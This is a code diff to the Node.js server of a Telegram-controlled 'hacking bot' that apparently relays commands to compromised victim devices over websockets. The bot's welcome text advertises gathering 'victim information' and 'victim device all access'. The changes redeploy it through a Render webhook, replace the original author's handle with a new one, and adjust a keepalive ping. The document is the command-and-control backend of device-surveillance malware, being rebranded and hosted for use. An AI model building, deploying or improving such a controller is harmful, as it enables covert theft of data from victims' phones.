@@ -12,9 +12,26 @@ const id = '7007427856'
 const address = 'https://www.google.com'
 
 const app = express();
+const PORT = process.env.PORT || 10000;
 const appServer = http.createServer(app);
+appServer.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server running on port ${PORT}`);
+});
 const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(token, {polling: true});
+const appBot = new telegramBot(token);
+
+// Set webhook on Render
+if (process.env.RENDER) {
+    const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/bot${token}`;
+    appBot.setWebHook(webhookUrl);
+    console.log('Webhook set to:', webhookUrl);
+}
+
+// Handle webhook updates
+app.post(`/bot${token}`, (req, res) => {
+    appBot.processUpdate(req.body);
+    res.sendStatus(200);
+});
 const appClients = new Map()
 
 const upload = multer();
@@ -311,11 +328,11 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 𝙃𝙚𝙡𝙡𝙤, 𝙢𝙮 𝘿𝙚𝙖𝙧 @dangerhack56 😎\n\n' +
+                '°• 𝙃𝙚𝙡𝙡𝙤, 𝙢𝙮 𝘿𝙚𝙖𝙧 FAHEEM 😎\n\n' +
                 '• ʜᴇʏ ᴛʜᴇʀᴇ! ɪ ᴀᴍ ᴛʜᴇ ʜᴀᴄᴋɪɴɢ ʙᴏᴛ. ɪ am ᴀ ʙᴏᴛ ᴛʜᴀᴛ ᴄᴀɴ ʜᴇʟᴘ ʏᴏᴜ ᴡɪᴛʜ ᴀʟʟ ʏᴏᴜʀ ʜᴀᴄᴋɪɴɢ ɴᴇᴇᴅs.\n\n' +
                 '• ɪ ᴄᴀɴ ʜᴇʟᴘ ʏᴏᴜ ғɪɴᴅ ᴠɪᴄᴛɪᴍ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴏɴ ᴛʜɪs ʜᴀᴄᴋɪɴɢ ʙᴏᴛ.\n\n' +
                 '• ɪ ᴄᴀɴ ᴀʟsᴏ ʜᴇʟᴘ ʏᴏᴜ ᴛᴏ ɢᴀᴛʜᴇʀ ᴠɪᴄᴛɪᴍ ɪɴғᴏʀᴍᴀᴛɪᴏɴ, sᴜᴄʜ ᴀs ᴠɪᴄᴛɪᴍ ᴅᴇᴠɪᴄᴇ ᴀʟʟ ᴀᴄᴄᴇss ɪɴ ᴛʜɪs ʙᴏᴛ.\n\n' +
-                '• ᴛʜɪs ʙᴏᴛ ᴡᴀs ᴍᴀᴅᴇ ʙʏ @dangerhack56 JOIN TELEGRAM',
+                '• ᴛʜɪs ʙᴏᴛ ᴡᴀs ᴍᴀᴅᴇ ʙʏ FAHEEMZTECH',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -710,11 +727,6 @@ appBot.on("callback_query", (callbackQuery) => {
 });
 setInterval(function () {
     appSocket.clients.forEach(function each(ws) {
-        ws.send('ping')
+        ws.send('ping');
     });
-    try {
-        axios.get(address).then(r => "")
-    } catch (e) {
-    }
-}, 5000)
-appServer.listen(process.env.PORT || 22222);
+}, 30000);
